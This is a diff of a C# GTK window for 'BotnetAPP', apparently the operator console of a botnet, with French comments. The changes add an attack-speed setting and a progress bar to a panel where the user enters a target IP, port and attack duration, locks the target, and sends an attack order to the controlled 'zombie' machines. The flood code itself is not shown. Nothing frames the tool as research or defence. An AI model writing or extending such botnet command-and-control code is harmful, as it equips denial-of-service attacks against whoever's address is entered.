@@ -18,11 +18,11 @@ namespace BotnetAPP.UI
 
         private Notebook notebook;
         private VBox _mainBox;
+        private Thread _startLevelBar ; 
 
         private Network.Connection _Net ;
 
-
-
+        // Thread pour la level bar
 
         enum Column
         {
@@ -41,11 +41,25 @@ namespace BotnetAPP.UI
 
         private Data.Connection db = new Data.Connection() ;
 
+        private SpinButton DurationAttackSetting ;  
+
+ 
+
+
+        private LevelBar lb ;
+
+        
+    
 
 
 
         public MainWindow() : base("BotnetApp - Main")
         {
+
+            _startLevelBar = new(StartLevelBar) ;
+            _startLevelBar.Name = "Chargement de la bar" ; 
+
+
 
             SetDefaultSize(500, 500);
             SetPosition(WindowPosition.Center);
@@ -76,6 +90,11 @@ namespace BotnetAPP.UI
 
 
             ZombiePage = new VBox();
+
+            lb = new() {
+                MinValue = 0,
+                MaxValue = 100
+            } ; 
 
             ScrolledWindow sw = new ScrolledWindow();
             sw.ShadowType = ShadowType.EtchedIn;
@@ -112,7 +131,8 @@ namespace BotnetAPP.UI
             sw.Add(treeView);
 
             ZombiePage.PackStart(sw, true, true, 0);
-            ZombiePage.PackEnd(AttackButton, false, true, 0);
+
+            ZombiePage.PackEnd(AttackButton, false, false, 0);
 
             /**
                 PAGE DE PARAMÈTRE 
@@ -127,10 +147,13 @@ namespace BotnetAPP.UI
             Entry TargetIPEntry = new Entry() { PlaceholderText = "IP Visé" };
 
             Label DurationAttackTitle = new Label("Durée de l'attaque");
-            SpinButton DurationAttackSetting = new SpinButton(0, 1440, 5);
+            DurationAttackSetting = new SpinButton(0, 1440, 5);
 
             Label LabelPortLibelle = new Label("Port Visé");
             SpinButton PortAttackSetting = new SpinButton(1024, 49151, 1);
+
+            Label LabelSpeedLibelle = new Label("Vitesse d'attaque en ms") ;
+            SpinButton SpeedAttackSetting = new SpinButton(0, 100000, 100) ;   
 
 
             Button VerrouillerCibleBouton = new Button("Valider");
@@ -139,13 +162,15 @@ namespace BotnetAPP.UI
             SettingPage.PackStart(DurationAttackTitle, false, false, 10);
             SettingPage.PackStart(DurationAttackSetting, false, true, 10);
 
-
             SettingPage.PackStart(TargetIPLibelle, false, false, 10);
             SettingPage.PackStart(TargetIPEntry, false, false, 10);
 
             SettingPage.PackStart(LabelPortLibelle, false, false, 10);
             SettingPage.PackStart(PortAttackSetting, false, false, 10);
 
+            SettingPage.PackStart(LabelSpeedLibelle, false, false, 10) ; 
+            SettingPage.PackStart(SpeedAttackSetting, false, false, 10) ; 
+ 
 
             SettingPage.PackEnd(VerrouillerCibleBouton, false, false, 0);
 
@@ -166,6 +191,7 @@ namespace BotnetAPP.UI
                     // On réactive les boutons                     
                     DurationAttackSetting.Sensitive = true;
                     TargetIPEntry.Sensitive = true;
+                    SpeedAttackSetting.Sensitive = true ;
                     PortAttackSetting.Sensitive = true;
 
                 }
@@ -177,17 +203,25 @@ namespace BotnetAPP.UI
                         {
                             if (DurationAttackSetting.ValueAsInt >= 1 && DurationAttackSetting.ValueAsInt <= 1440)
                             {
-                                IsLockedTarget = true;
+                                if ( SpeedAttackSetting.ValueAsInt >= 1 && SpeedAttackSetting.ValueAsInt <= 10000 ) {
+                                    IsLockedTarget = true;
 
-                                // ON désactive les boutons
-                                DurationAttackSetting.Sensitive = false;
-                                TargetIPEntry.Sensitive = false;
-                                PortAttackSetting.Sensitive = false;
+                                    // ON désactive les boutons
+                                    DurationAttackSetting.Sensitive = false;
+                                    TargetIPEntry.Sensitive = false;
+                                    PortAttackSetting.Sensitive = false;
+                                    SpeedAttackSetting.Sensitive = false ; 
 
-                                AttackButton.Sensitive = true;
-                                AttackButton.Label = "Attaquer la cible verrouiller";
-
-                                VerrouillerCibleBouton.Label = "Changer de cible" ; 
+                                    AttackButton.Sensitive = true;
+                                    AttackButton.Label = "Attaquer la cible verrouiller";
+                                    VerrouillerCibleBouton.Label = "Changer de cible" ;
+                                    
+                                     
+                                } else {
+                                    MessageDialog md = new MessageDialog(this, DialogFlags.DestroyWithParent, MessageType.Error, ButtonsType.Close, "La vitesse d'execution de l'attaque n'est pas valide");
+                                    md.Run();
+                                    md.Destroy();
+                                }
                             }
                             else
                             {
@@ -230,14 +264,13 @@ namespace BotnetAPP.UI
             notebook = new Notebook();
             notebook.ShowTabs = true;
 
-            notebook.AppendPage(DashboardPage, new Label("Dashboard"));
             notebook.AppendPage(ZombiePage, new Label("Attaque"));
-            notebook.AppendPage(new Frame(), new Label("History"));
+           // notebook.AppendPage(new Frame(), new Label("History")); Fonctionnalité qui arrive plus tard 
             notebook.AppendPage(SettingPage, new Label("Setting"));
             notebook.AppendPage(new Frame(), new Label("About"));
 
-
-            _mainBox.PackEnd(notebook, true, true, 0);
+            _mainBox.PackStart(lb, false, true, 0);
+            _mainBox.PackEnd(notebook, true, true, 0) ;
 
 
             Add(_mainBox);
@@ -251,9 +284,18 @@ namespace BotnetAPP.UI
 
                 AttackButton.Sensitive = false ;
                 VerrouillerCibleBouton.Sensitive = false ;
+                SpeedAttackSetting.Sensitive = false ; 
+
+                // On envoie l'ordre de l'attaque
+                _Net.GiveOrder(new Order(PortAttackSetting.ValueAsInt , TargetIPEntry.Text, DurationAttackSetting.ValueAsInt, SpeedAttackSetting.ValueAsInt)) ;
+                
+                _startLevelBar = new Thread(StartLevelBar) ; 
 
 
-                _Net.GiveOrder(new Order(PortAttackSetting.ValueAsInt , TargetIPEntry.Text, DurationAttackSetting.ValueAsInt  )) ;
+                    _startLevelBar.Start() ;
+                
+
+                 
 
             
             } ;
@@ -261,6 +303,27 @@ namespace BotnetAPP.UI
 
             ShowAll();
         }
+
+        private void StartLevelBar() {
+
+            int secondeEcoulee = 0  ; 
+
+            while (secondeEcoulee < DurationAttackSetting.ValueAsInt ) {
+
+                ++secondeEcoulee ;  
+                
+                lb.Value = 100*secondeEcoulee/DurationAttackSetting.ValueAsInt ;  
+
+                /*
+                Vitesse de rafraichissement de la barre
+                */
+                Thread.Sleep(1000) ; 
+            }
+
+            // On redémarre la barre étant donnée que l'attaque est terminée
+            lb.Value = 0 ;
+
+            }
 
 
 
